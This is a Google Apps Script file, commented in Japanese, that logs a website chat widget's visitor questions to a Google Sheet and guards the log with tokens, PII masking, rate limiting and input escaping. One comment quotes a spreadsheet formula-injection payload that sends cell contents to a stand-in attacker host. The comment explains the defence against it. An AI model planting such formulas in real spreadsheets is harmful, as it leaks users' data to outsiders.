/**
 * メロー チャット — 質問ログ受け口（Google Apps Script）
 * ------------------------------------------------------------------
 * ウィジェットから送られてくる質問を、Googleスプレッドシートに1行ずつ追記します。
 *
 * 【セットアップ手順】
 *  1. Googleスプレッドシートを新規作成する（名前は何でもOK。例:「メロー質問ログ」）。
 *  2. メニュー「拡張機能」→「Apps Script」を開く。
 *  3. 既定のコードを全部消して、このファイルの内容を丸ごと貼り付けて保存。
 *  4. 右上「デプロイ」→「新しいデプロイ」→種類で「ウェブアプリ」を選択。
 *       - 説明: 任意（例: chat-log）
 *       - 次のユーザーとして実行: 自分
 *       - アクセスできるユーザー: 「全員」 ← ここ重要
 *     →「デプロイ」を押し、表示された【ウェブアプリのURL】をコピー。
 *  5. そのURLを public/chat-widget.js の CONFIG.logUrl に貼り付ける。
 *  6. 完了。チャットで質問するたびにスプレッドシートへ行が追加されます。
 *
 *  ※コードを直したときは「デプロイの管理」→鉛筆→「新バージョン」で再デプロイ。
 *
 *  ※「結果」列を新設しました。【既にシート運用中の場合】見出し行の末尾（H1セル）に
 *    手動で「結果」と入力してください（新規シートでは自動で入ります）。以降の行に
 *    answered/fallback などの種別が記録され、未回答の棚卸しに使えます。
 * ------------------------------------------------------------------
 */

// 書き込み先シート名（自動で作成されます。変えてもOK）
var SHEET_NAME = "questions";

// 1行目に入れる見出し
// 「結果」列は応対の種別。未回答の棚卸し（FAQ育成）に使う：
//   answered=即回答 / ambiguous=候補提示(僅差) / suggested=候補提示(言い換え不足)
//   fallback=手がかりゼロ(新規FAQ候補) / resolved=役に立った / unresolved=的外れ
// ▼棚卸しのコツ：シートのフィルタで「結果」を fallback / suggested / unresolved に
//   絞って書き出し、tools/grow-faq-prompt.md に渡すとFAQ更新案が作れる。
// ※「結果」は末尾に追加。既存シート（旧7列）の列ズレを避けるため中間に挿入しない。
var HEADERS = ["日時", "質問", "ヒット", "一致したFAQ", "入力元", "ページ", "UA", "結果"];

// ▼ スパム/不正対策（任意・推奨）
// このエンドポイントは「全員」公開のため、URLが漏れると誰でも書き込めてしまいます。
// 下記を設定すると、正規のウィジェットからの送信だけを受け付けます。
//   SHARED_TOKEN     … chat-widget.js の CONFIG.logToken と同じ文字列を入れる（空なら検証しない）
//   ALLOWED_PAGE_PREFIX … この接頭辞で始まる page だけ受理（空なら検証しない。localhost は常に許可）
//   MAX_QUESTION_LEN … 記録する質問文の最大長（長文スパム対策）
var SHARED_TOKEN = "a84625f7acfb218fd18482c16cf67ee4";
var ALLOWED_PAGE_PREFIX = "https://mellow-wet.jp";
var MAX_QUESTION_LEN = 500;

// ▼ ログ閲覧用トークン
// SHARED_TOKEN は公開JS内に書くため誰でも読めます。書き込みと閲覧を同じ
// トークンで守ると、JSを見た人が ?action=export で質問ログを全部ダウンロード
// できてしまいます（訪問者の質問には個人的な事情が書かれていることがある）。
// そのため閲覧は別トークンで守りますが、その値はこのファイルに書きません。
// このリポジトリは公開されているため、ここに書くと結局誰でも読めるからです。
// 値はスクリプト プロパティ（サーバー側の保管領域）に置きます。
//
// 【使い方】ログをエクスポートしたくなったら、スクリプトエディタで
// setupExportToken を1回実行してください。トークンが発行され実行ログに出ます。
// 未設定の間はエクスポート機能は常に拒否されます（既定で閉じている状態）。
var EXPORT_TOKEN_PROP = "EXPORT_TOKEN";

function getExportToken_() {
  try {
    return PropertiesService.getScriptProperties().getProperty(EXPORT_TOKEN_PROP) || "";
  } catch (e) {
    return "";
  }
}

// 閲覧用トークンを発行して保存する（手動で1回だけ実行）。
// 実行ログに出た値を tools/harvest-questions.mjs に環境変数で渡します:
//   MELLOW_EXPORT_TOKEN="発行された値" node tools/harvest-questions.mjs
function setupExportToken() {
  var t = Utilities.getUuid().replace(/-/g, "") + Utilities.getUuid().replace(/-/g, "").slice(0, 8);
  PropertiesService.getScriptProperties().setProperty(EXPORT_TOKEN_PROP, t);
  Logger.log("閲覧用トークンを発行しました。この値は他人に渡さないでください:\n" + t);
  return t;
}

// ▼ 流量制限（1分あたりの受理件数）
// 公開エンドポイントなので、トークンが漏れれば大量書き込みでシートを汚せる。
// 通常の訪問者が1分に何十件も質問することはないため、超過分は静かに捨てる。
var MAX_WRITES_PER_MINUTE = 20;

function doPost(e) {
  try {
    var data = {};
    if (e && e.postData && e.postData.contents) {
      data = JSON.parse(e.postData.contents);
    }

    // --- 検証（不正な書き込みを弾く）---
    if (SHARED_TOKEN && String(data.token || "") !== SHARED_TOKEN) {
      return json_({ ok: false, error: "unauthorized" });
    }
    var page = String(data.page || "");
    var pageOk = !ALLOWED_PAGE_PREFIX
      || page.indexOf(ALLOWED_PAGE_PREFIX) === 0
      || page.indexOf("http://localhost") === 0
      || page.indexOf("http://127.0.0.1") === 0;
    if (!pageOk) {
      return json_({ ok: false, error: "bad origin" });
    }
    if (!underRateLimit_()) {
      return json_({ ok: false, error: "rate limited" });
    }
    // 伏字はウィジェット側でも行うが、古いJSがキャッシュに残っている端末や
    // 直接POSTされた場合に備えて、保存直前にもう一度かける。
    var question = maskPII_(String(data.question || "")).slice(0, MAX_QUESTION_LEN);

    var sheet = getSheet_();
    var now = Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyy-MM-dd HH:mm:ss");

    // 訪問者が書いた文字列は、すべて数式にならない形に落としてから入れる。
    sheet.appendRow([
      now,
      cellText_(question),
      data.hit ? "○" : "×（未回答）",
      cellText_(data.matched),
      data.source === "preset" ? "ボタン" : (data.source === "feedback" ? "評価" : "自由入力"),
      cellText_(page),
      cellText_(data.ua),
      cellText_(data.outcome)
    ]);

    return json_({ ok: true });
  } catch (err) {
    // 例外の中身（シート名・行番号など内部の情報）は外へ返さず、記録だけ残す。
    console.error(err);
    return json_({ ok: false, error: "server error" });
  }
}

// GET の入口。
//  ・引数なし          … 動作確認メッセージを返す（ブラウザでURLを開いたとき）
//  ・?action=export … 記録済みログをJSONで返す（FAQ育成スクリプトが読む口）
//      &token=…   SHARED_TOKEN を設定している場合は必須
//      &days=30   直近N日だけ返す（既定30。0で全期間）
//      &learn=1   育成対象（結果が fallback/suggested/unresolved、または未回答）だけに絞る
//      &limit=2000 返す最大件数（新しい順。既定2000）
function doGet(e) {
  var p = (e && e.parameter) || {};
  if (p.action === "export") {
    return exportLog_(p);
  }
  return ContentService
    .createTextOutput("mellow chat log endpoint is running.")
    .setMimeType(ContentService.MimeType.TEXT);
}

// 育成対象とみなす結果種別（言い換え不足・新規FAQ候補・的外れ）
var LEARN_OUTCOMES = { fallback: true, suggested: true, unresolved: true };

// ログをJSONで書き出す。tools/harvest-questions.mjs から呼ばれる想定。
// 個人情報は記録時に伏字化済み（maskPII）なので、保存値をそのまま返す。
function exportLog_(p) {
  // 閲覧は専用トークンのみで許可する。書き込み用の SHARED_TOKEN は公開JSに
  // 載っているため、それで閲覧を許すと誰でも質問ログを吸い出せてしまう。
  // 未発行なら常に拒否（既定で閉じている＝設定し忘れが穴にならない）。
  var expected = getExportToken_();
  if (!expected || !sameToken_(String(p.token || ""), expected)) {
    return json_({ ok: false, error: "unauthorized" });
  }

  var sheet = getSheet_();
  var lastRow = sheet.getLastRow();
  if (lastRow < 2) return json_({ ok: true, count: 0, rows: [] });

  var header = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
  var col = {};
  for (var c = 0; c < header.length; c++) col[String(header[c])] = c;
  // 旧シート（結果列なし）でも落ちないよう、見出し名で列位置を引く
  var iDate = col["日時"], iQ = col["質問"], iHit = col["ヒット"],
      iMatched = col["一致したFAQ"], iOutcome = col["結果"];

  var days = p.days == null ? 30 : parseInt(p.days, 10);
  var learnOnly = String(p.learn || "") === "1";
  var limit = p.limit == null ? 2000 : parseInt(p.limit, 10);

  // 日時は "yyyy-MM-dd HH:mm:ss"（固定幅・辞書順＝時系列）なので文字列比較で期間判定できる
  var cutoff = "";
  if (days && days > 0) {
    var since = new Date(new Date().getTime() - days * 24 * 60 * 60 * 1000);
    cutoff = Utilities.formatDate(since, "Asia/Tokyo", "yyyy-MM-dd HH:mm:ss");
  }

  var values = sheet.getRange(2, 1, lastRow - 1, header.length).getValues();
  var rows = [];
  for (var r = values.length - 1; r >= 0; r--) {       // 新しい順
    var v = values[r];
    var date = normalizeDate_(v[iDate]);
    if (cutoff && date < cutoff) continue;
    var hitCell = String(v[iHit] || "");
    var hit = hitCell.indexOf("○") === 0;
    var outcome = iOutcome != null ? String(v[iOutcome] || "") : "";
    if (learnOnly) {
      // 結果列がある行は種別で判定。無い旧行は「未回答」を拾う。
      var keep = outcome ? !!LEARN_OUTCOMES[outcome] : !hit;
      if (!keep) continue;
    }
    rows.push({
      date: date,
      question: String(v[iQ] || ""),
      hit: hit,
      outcome: outcome,
      matched: iMatched != null ? String(v[iMatched] || "") : ""
    });
    if (rows.length >= limit) break;
  }
  return json_({ ok: true, count: rows.length, rows: rows });
}

// トークンの比較。=== は最初に違う文字で止まるため、応答時間の差から
// 1文字ずつ当てられる余地がある。長さが同じなら最後まで比べる。
function sameToken_(a, b) {
  if (a.length !== b.length) return false;
  var diff = 0;
  for (var i = 0; i < a.length; i++) diff |= a.charCodeAt(i) ^ b.charCodeAt(i);
  return diff === 0;
}

// 質問文に紛れ込んだ連絡先を伏字にする（public/chat-widget.js の maskPII と同じ規則）。
function maskPII_(s) {
  return String(s == null ? "" : s)
    .replace(/[\w.+-]+@[\w-]+\.[\w.-]+/g, "[メール]")
    .replace(/0\d{1,3}[-(\s]?\d{1,4}[-)\s]?\d{3,4}/g, "[電話]")
    .replace(/\d[\d\s-]{11,}\d/g, "[番号]")
    .replace(/〒?\s?\d{3}-\d{4}/g, "[郵便番号]");
}

// 訪問者の入力をセルに入れる前に「ただの文字列」へ落とす。
// ------------------------------------------------------------------
// スプレッドシートは "=" "+" "-" "@" で始まる値を数式として解釈する。
// つまり質問欄に =IMPORTXML("https://攻撃者/?d="&A1) と打たれると、
// シートを開いた本人のブラウザで実行され、隣のセルの内容が外部へ送られる。
// （HYPERLINK で偽リンクを仕込む、IMAGE で外部にアクセスさせる等も同様。）
// 先頭に ' を付けると Sheets は常に文字列として扱い、表示上 ' は出ない。
function cellText_(v) {
  var s = String(v == null ? "" : v);
  if (s === "") return "";
  // 制御文字（改行・タブ）は行崩れと判定回避に使われるため潰す
  s = s.replace(/[\r\n\t]+/g, " ");
  if (/^[=+\-@]/.test(s)) return "'" + s;
  return s;
}

// 1分あたりの受理件数を制限する。CacheService はスクリプト単位の共有領域。
// 上限に達している間は false を返し、呼び出し側で書き込みを見送る。
function underRateLimit_() {
  if (!MAX_WRITES_PER_MINUTE) return true;
  try {
    var cache = CacheService.getScriptCache();
    var key = "w:" + Utilities.formatDate(new Date(), "Asia/Tokyo", "yyyyMMddHHmm");
    var n = parseInt(cache.get(key) || "0", 10) + 1;
    cache.put(key, String(n), 120);   // 2分保持（分キーなので実質1分窓）
    return n <= MAX_WRITES_PER_MINUTE;
  } catch (e) {
    return true;   // キャッシュが使えない時は記録を止めない
  }
}

function getSheet_() {
  var ss = SpreadsheetApp.getActiveSpreadsheet();
  var sheet = ss.getSheetByName(SHEET_NAME);
  if (!sheet) {
    sheet = ss.insertSheet(SHEET_NAME);
  }
  if (sheet.getLastRow() === 0) {
    sheet.appendRow(HEADERS);
    sheet.getRange(1, 1, 1, HEADERS.length).setFontWeight("bold");
    sheet.setFrozenRows(1);
  }
  // データ行はすべて「文字列」書式にする。理由は2つ。
  //  ① 日時が日付型になると exportLog_ の期間判定（固定幅の文字列比較）が
  //     成立せず days 指定が無視される
  //  ② 書式が自動のままだと "=..." が数式として評価される。cellText_ で
  //     先頭に ' を付けているが、書式側でも二重に止めておく
  if (sheet.getRange("A2").getNumberFormat() !== "@") {
    sheet.getRange(2, 1, sheet.getMaxRows() - 1, HEADERS.length).setNumberFormat("@");
  }
  return sheet;
}

// 日時セルの値を "yyyy-MM-dd HH:mm:ss" に揃える。
// 上の書式指定より前に書かれた行は Date 型で入っているため、その救済も兼ねる。
function normalizeDate_(v) {
  if (v instanceof Date) {
    return Utilities.formatDate(v, "Asia/Tokyo", "yyyy-MM-dd HH:mm:ss");
  }
  return String(v || "");
}

// ------------------------------------------------------------------
// 手動メンテ用：テスト行の掃除
// ------------------------------------------------------------------
// スクリプトエディタで関数 clearTestRows を選んで実行すると、動作確認で
// 入れた行（UAが setup-test / sec / flood… の行）だけを削除します。
// 訪問者の実データ（UAが "iOS / Safari" のような形）には触りません。
var TEST_UA_MARKERS = ["setup-test", "sec", "flood", "flood2"];

function clearTestRows() {
  var sheet = getSheet_();
  var last = sheet.getLastRow();
  if (last < 2) return;
  var header = sheet.getRange(1, 1, 1, sheet.getLastColumn()).getValues()[0];
  var iUA = header.indexOf("UA");
  if (iUA < 0) return;
  var values = sheet.getRange(2, 1, last - 1, header.length).getValues();
  var removed = 0;
  // 下から消す（上から消すと行番号がずれる）
  for (var r = values.length - 1; r >= 0; r--) {
    var ua = String(values[r][iUA] || "");
    if (TEST_UA_MARKERS.indexOf(ua) !== -1) {
      sheet.deleteRow(r + 2);
      removed++;
    }
  }
  Logger.log("削除した行数: " + removed);
}

// ------------------------------------------------------------------
// 保存期間：古い質問ログを自動で消す
// ------------------------------------------------------------------
// FAQ育成に使うのは直近の数か月分だけ。訪問者の質問を無期限に持ち続けると、
// 万一シートが漏れたときの被害が大きくなるだけなので、期限を過ぎた行は消す。
// 【使い方】スクリプトエディタで setupRetentionTrigger を1回実行すると、
// 毎日深夜に purgeOldRows が動くようになる。
var RETENTION_DAYS = 180;

function purgeOldRows() {
  var sheet = getSheet_();
  var last = sheet.getLastRow();
  if (last < 2) return;
  var since = new Date(new Date().getTime() - RETENTION_DAYS * 24 * 60 * 60 * 1000);
  var cutoff = Utilities.formatDate(since, "Asia/Tokyo", "yyyy-MM-dd HH:mm:ss");
  var dates = sheet.getRange(2, 1, last - 1, 1).getValues();
  // 行は時系列に追記されるので、期限切れは先頭から連続している
  var n = 0;
  while (n < dates.length && normalizeDate_(dates[n][0]) < cutoff) n++;
  if (n > 0) sheet.deleteRows(2, n);
  Logger.log("期限切れで削除した行数: " + n);
}

function setupRetentionTrigger() {
  ScriptApp.getProjectTriggers().forEach(function (t) {
    if (t.getHandlerFunction() === "purgeOldRows") ScriptApp.deleteTrigger(t);
  });
  ScriptApp.newTrigger("purgeOldRows").timeBased().everyDays(1).atHour(3).create();
  Logger.log("毎日3時に " + RETENTION_DAYS + " 日より古い行を削除します");
}

function json_(obj) {
  return ContentService
    .createTextOutput(JSON.stringify(obj))
    .setMimeType(ContentService.MimeType.JSON);
}
